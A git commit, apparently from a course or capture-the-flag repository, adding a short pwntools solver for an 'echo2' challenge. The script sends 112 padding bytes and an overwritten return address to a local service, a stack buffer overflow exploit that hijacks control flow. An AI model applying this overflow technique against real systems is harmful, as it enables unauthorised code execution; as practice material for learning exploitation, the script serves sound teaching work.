e978a8b750c049066cdb3ceb4861c483572d0371
moratorium08 <moratorium0hiro8sanctuary@gmail.com>
2017-05-26 09:27:54 +0900

    Add solver of echo2

---
+++ docs/04/solve.py
@@ -0,0 +1,15 @@
+# coding:utf-8
+from pwn import remote, p32
+
+host = "127.0.0.1"
+port = 3000
+
+r = remote(host, port)
+
+r.recvuntil("name: ")
+
+code = "A" * 112  # dummy
+code += p32(0x80484fd)
+r.sendline(code)
+
+r.interactive()
